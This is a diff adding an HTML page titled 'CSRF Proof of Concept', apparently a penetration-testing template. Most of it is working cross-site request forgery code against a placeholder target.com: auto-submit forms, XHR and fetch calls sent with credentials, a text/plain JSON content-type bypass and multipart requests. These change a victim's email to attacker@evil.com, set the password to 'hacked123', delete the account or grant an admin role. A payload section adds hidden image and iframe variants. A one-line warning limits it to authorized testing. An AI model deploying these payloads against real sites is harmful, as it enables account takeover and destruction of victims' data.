@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Proof of Concept</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #d32f2f;
+            border-bottom: 2px solid #d32f2f;
+            padding-bottom: 10px;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .payload {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+            border-left: 4px solid #007bff;
+        }
+        .btn {
+            background: #007bff;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 5px;
+        }
+        .btn-danger {
+            background: #dc3545;
+        }
+        .btn-success {
+            background: #28a745;
+        }
+        code {
+            background: #e9ecef;
+            padding: 2px 6px;
+            border-radius: 3px;
+        }
+        pre {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛡️ CSRF Proof of Concept</h1>
+        
+        <div class="warning">
+            <strong>⚠️ Warning:</strong> This page is for authorized security testing only.
+        </div>
+
+        <h2>Method 1: Auto-submit Form (GET)</h2>
+        <p>This form automatically submits via GET request:</p>
+        
+        <div class="payload">
+            <h3>Target: Change Email</h3>
+            <form id="csrf-get" method="GET" action="https://target.com/change-email">
+                <input type="hidden" name="email" value="attacker@evil.com">
+                <input type="submit" value="CSRF GET Attack" class="btn btn-danger">
+            </form>
+        </div>
+
+        <h2>Method 2: Auto-submit Form (POST)</h2>
+        <p>This form automatically submits via POST request:</p>
+        
+        <div class="payload">
+            <h3>Target: Change Password</h3>
+            <form id="csrf-post" method="POST" action="https://target.com/change-password">
+                <input type="hidden" name="new_password" value="hacked123">
+                <input type="hidden" name="confirm_password" value="hacked123">
+                <input type="submit" value="CSRF POST Attack" class="btn btn-danger">
+            </form>
+        </div>
+
+        <h2>Method 3: Auto-submit with JavaScript</h2>
+        <p>Form auto-submits immediately on page load:</p>
+        
+        <div class="payload">
+            <h3>Target: Delete Account</h3>
+            <form id="csrf-auto" method="POST" action="https://target.com/delete-account">
+                <input type="hidden" name="confirm" value="true">
+            </form>
+        </div>
+
+        <h2>Method 4: XMLHttpRequest CSRF</h2>
+        <p>Uses XHR to send CSRF request:</p>
+        
+        <div class="payload">
+            <button onclick="csrfXHR()" class="btn btn-danger">XHR CSRF Attack</button>
+            <pre id="xhr-result">Response will appear here...</pre>
+        </div>
+
+        <h2>Method 5: Fetch API CSRF</h2>
+        <p>Uses Fetch API for CSRF:</p>
+        
+        <div class="payload">
+            <button onclick="csrfFetch()" class="btn btn-danger">Fetch CSRF Attack</button>
+            <pre id="fetch-result">Response will appear here...</pre>
+        </div>
+
+        <h2>Method 6: JSON CSRF (Content-Type: text/plain)</h2>
+        <p>Bypasses JSON content-type checks:</p>
+        
+        <div class="payload">
+            <button onclick="csrfJSON()" class="btn btn-danger">JSON CSRF Attack</button>
+            <pre id="json-result">Response will appear here...</pre>
+        </div>
+
+        <h2>Method 7: Multipart Form CSRF</h2>
+        <p>Uses multipart/form-data encoding:</p>
+        
+        <div class="payload">
+            <button onclick="csrfMultipart()" class="btn btn-danger">Multipart CSRF Attack</button>
+            <pre id="multipart-result">Response will appear here...</pre>
+        </div>
+
+        <h2>Payload Examples</h2>
+        
+        <div class="payload">
+            <h3>Basic CSRF Payload (HTML)</h3>
+            <pre>&lt;form method="POST" action="https://target.com/api/change-email"&gt;
+    &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</pre>
+        </div>
+
+        <div class="payload">
+            <h3>CSRF with Image Tag (GET only)</h3>
+            <pre>&lt;img src="https://target.com/api/delete-user?user=victim" style="display:none"&gt;</pre>
+        </div>
+
+        <div class="payload">
+            <h3>CSRF with Iframe</h3>
+            <pre>&lt;iframe src="https://target.com/api/change-role?role=admin" style="display:none"&gt;&lt;/iframe&gt;</pre>
+        </div>
+
+        <div class="payload">
+            <h3>JSON CSRF via text/plain</h3>
+            <pre>&lt;form method="POST" action="https://target.com/api/update" enctype="text/plain"&gt;
+    &lt;input name='{"email":"attacker@evil.com"}' value=""&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</pre>
+        </div>
+
+        <div class="payload">
+            <h3>CSRF via XHR (Same-Origin)</h3>
+            <pre>var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://target.com/api/change-email", true);
+xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.send("email=attacker@evil.com");</pre>
+        </div>
+    </div>
+
+    <script>
+        // Auto-submit form 1 (GET)
+        // Uncomment to auto-submit: document.getElementById('csrf-get').submit();
+
+        // Auto-submit form 2 (POST)
+        // Uncomment to auto-submit: document.getElementById('csrf-post').submit();
+
+        // Auto-submit form 3 (Immediate)
+        // Uncomment to auto-submit: document.getElementById('csrf-auto').submit();
+
+        // XHR CSRF
+        function csrfXHR() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://target.com/api/change-email", true);
+            xhr.withCredentials = true;
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.onload = function() {
+                document.getElementById('xhr-result').textContent = 
+                    "Status: " + xhr.status + "\nResponse: " + xhr.responseText;
+            };
+            xhr.send("email=attacker@evil.com");
+        }
+
+        // Fetch CSRF
+        function csrfFetch() {
+            fetch("https://target.com/api/change-email", {
+                method: "POST",
+                credentials: "include",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: "email=attacker@evil.com"
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById('fetch-result').textContent = data;
+            })
+            .catch(error => {
+                document.getElementById('fetch-result').textContent = "Error: " + error;
+            });
+        }
+
+        // JSON CSRF (text/plain bypass)
+        function csrfJSON() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://target.com/api/update", true);
+            xhr.withCredentials = true;
+            xhr.setRequestHeader("Content-Type", "text/plain");
+            xhr.onload = function() {
+                document.getElementById('json-result').textContent = 
+                    "Status: " + xhr.status + "\nResponse: " + xhr.responseText;
+            };
+            xhr.send('{"email":"attacker@evil.com"}');
+        }
+
+        // Multipart CSRF
+        function csrfMultipart() {
+            var formData = new FormData();
+            formData.append("email", "attacker@evil.com");
+            
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://target.com/api/change-email", true);
+            xhr.withCredentials = true;
+            xhr.onload = function() {
+                document.getElementById('multipart-result').textContent = 
+                    "Status: " + xhr.status + "\nResponse: " + xhr.responseText;
+            };
+            xhr.send(formData);
+        }
+
+        // Auto-submit on load (uncomment to enable)
+        // window.onload = function() {
+        //     document.getElementById('csrf-get').submit();
+        //     document.getElementById('csrf-post').submit();
+        //     document.getElementById('csrf-auto').submit();
+        // };
+    </script>
+</body>
+</html>
